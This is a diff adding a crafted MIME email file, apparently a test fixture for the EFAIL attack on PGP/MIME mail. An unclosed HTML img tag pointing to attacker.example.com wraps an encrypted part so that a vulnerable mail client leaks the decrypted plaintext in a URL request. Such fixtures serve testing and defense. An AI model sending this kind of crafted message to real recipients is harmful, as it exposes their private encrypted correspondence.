@@ -1,0 +1,48 @@
+From: Mallory Example <mallory@example.com>
+To: Alice Example <alice@example.org>
+Subject: Hello
+Date: Sun, 01 Nov 2026 10:00:00 +0100
+Message-ID: <efail@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="efail"
+
+--efail
+Content-Type: text/html; charset="utf-8"
+
+<img src="https://attacker.example.com/?
+--efail
+Content-Type: multipart/encrypted; protocol="application/pgp-encrypted"; boundary="efail-enc"
+
+--efail-enc
+Content-Type: application/pgp-encrypted
+Content-Description: PGP/MIME version identification
+
+Version: 1
+
+--efail-enc
+Content-Type: application/octet-stream; name="encrypted.asc"
+Content-Disposition: inline; filename="encrypted.asc"
+
+-----BEGIN PGP MESSAGE-----
+
+hF4DGPnudEGlImASAQdARyA+xubwxEKzkq4DzD1zMNpCN0uZAny5oDU7QxsQWjcw
+XzEtnLnSiJyFFvUWf/5naF1TwwcFfag2vitzNlMimVeaKodwTQWt00Lv0oGx+awL
+0sDXASUQkF7hcvdbL808W/JlYiC5ya8+IHm6YQEqlTxv8cQAaigUyiET4VtoMeDt
+BrnUybJMz3f2vPqjfLhd6V4lZDb7VrAnRgHgC7KRz8DUf6aYxXO5J22mOqI6cF2c
+KGTDp4RbchH8BejYye0/ujk+i/oizbcNCuepnG1WcJGloTadwMfsK83Nu94/P6pU
+6q0bSymfL81iGEAdCe9mc2C+BtiZkQnc37EBilFLdrqC8WYQdudqpLDe5MFfim0+
+nYkj3plwgSLBHJV5tTQk3C7EmC8Crhlq3jD/leJFIDOpBRSRClgNoWRubtlKiCky
+GIUSgWZWpYovPaIseOksaOcYArxy29UyOL+GH6yb4x8aop6BeiCl1LYOeYxkColx
+nkihmpuGFHxyuKfT/KuELWzfRAIyPbMRaQPaWBQLEEoiArVJMOXkXLE9GBJtlsqJ
+XhvT9yhnT6a3Mse7RLb02PKbg+5wDsNEvfCpYNrT2lBkEH1VTNkbABO08otuiHXU
+qGN4oImVjlX3G+AIuQnQbVjx36u0q5POSKA=
+=nSPS
+-----END PGP MESSAGE-----
+
+--efail-enc--
+
+--efail
+Content-Type: text/html; charset="utf-8"
+
+">
+--efail--
